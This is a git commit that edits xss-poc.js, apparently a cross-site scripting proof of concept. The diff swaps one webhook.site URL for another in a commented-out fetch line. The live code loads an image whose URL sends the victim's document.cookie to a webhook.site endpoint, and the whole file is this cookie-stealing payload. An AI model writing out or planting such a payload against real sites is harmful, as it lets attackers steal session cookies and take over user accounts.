730f9533e3eb8b40a88769ebf5fc4a7e030a6b0f
smcri <poashan1234@gmail.com>
2024-03-10 16:03:55 +0530

    Update xss-poc.js

--- xss-poc.js
+++ xss-poc.js
@@ -1,3 +1,3 @@
-// fetch("https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/?cookie=" + document.cookie);
+// fetch("https://webhook.site/26cb62e6-b4b1-4013-8a07-3abe24feea0a?cookie=" + document.cookie);
 
 var i=new Image;i.src="https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/?cookie="+document.cookie;
